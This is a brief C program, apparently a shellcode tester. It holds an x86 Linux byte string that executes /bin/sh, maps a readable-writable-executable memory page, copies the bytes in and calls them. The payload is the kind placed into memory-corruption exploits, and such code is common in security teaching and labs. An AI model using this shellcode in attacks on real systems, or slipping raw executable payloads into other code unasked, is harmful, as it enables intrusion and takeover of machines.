#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>

int main()
{
    char code[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";

	char *other_code = mmap(0, sizeof(code), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	memcpy(other_code, code, sizeof(code));

    (*(void(*)()) other_code)();
    return 0;
}
